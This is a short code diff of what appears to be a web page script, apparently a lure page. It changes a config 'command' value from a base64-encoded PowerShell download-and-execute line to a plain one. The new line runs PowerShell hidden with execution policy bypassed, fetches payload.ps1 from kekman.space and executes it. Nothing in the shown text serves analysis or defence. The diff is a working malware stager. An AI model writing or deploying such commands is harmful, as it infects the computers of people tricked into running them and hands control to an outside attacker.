@@ -346,8 +346,8 @@
 (function() {
   // ---- CONFIG ----
   const CONFIG = {
-    command: 'powershell -e JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB0AD0AJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcoICcAaAB0AHQAcABzADoALwAvAGsAZQBrAG0AYQBuAC4AcwBwAGEAYwBlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA7AGkAZQB4ACAAJAB0AA=='
-  };
+    command: 'powershell -ep bypass -w hidden -c "$a=&(gcm iwr) ''https://kekman.space/payload.ps1'' -UseBasicParsing;$a.Content|powershell -w hidden -"'
+};
 
   // ---- Fill dynamic content ----
   const hostname = window.location.hostname || 'kekman.space';
